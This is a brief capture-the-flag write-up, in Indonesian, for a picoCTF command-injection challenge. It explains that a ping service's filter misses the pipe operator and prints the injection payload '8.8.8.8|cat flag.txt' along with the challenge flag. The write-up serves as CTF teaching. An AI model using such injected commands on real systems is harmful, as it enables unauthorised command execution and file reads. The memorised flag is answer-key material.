# Writeup: ping-cmd (Challenge ID: 757)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** General Skills / Command Injection
- **Difficulty:** Easy
- **Author:** Yahaya Meddy
- **Event:** picoCTF 2026
- **Points:** 100
- **Flag:** `academy{p1nG_c0mm@nd_3xpL0it_su33essFuL_0b4c0edc}`

---

## Deskripsi Tantangan
> Can you make the server reveal its secrets?
> It seems to be able to ping Google DNS, but what happens if you get a little creative with your input?
> Hints:
> 1. The program uses a shell command behind the scenes.
> 2. Sometimes, You can run more than one command at a time.

---

## Analisis Kerentanan (Command Injection via Pipe)
Layanan mengekspos prompt TCP (`nc chatelaine.cylabacademy.net <port>`) yang meminta alamat IP untuk diping (misal `8.8.8.8`). Di balik layar, script memanggil command shell seperti `ping -c 2 $INPUT`.

Karakter separator umum seperti `;`, `&&`, atau newline (`\n`) tidak dieksekusi atau tersaring oleh sanitasi dasar. Namun, operator pipe Unix (`|`) tidak dibatasi, sehingga output perintah ping diteruskan langsung ke input perintah yang diinjeksi.

### Langkah Eksploitasi
1. Koneksi ke socket layanan:
   ```bash
   nc chatelaine.cylabacademy.net <port>
   ```
2. Kirim payload pipe:
   ```text
   8.8.8.8|cat flag.txt
   ```
3. Output yang dikembalikan:
   ```text
   academy{p1nG_c0mm@nd_3xpL0it_su33essFuL_0b4c0edc}
   ```
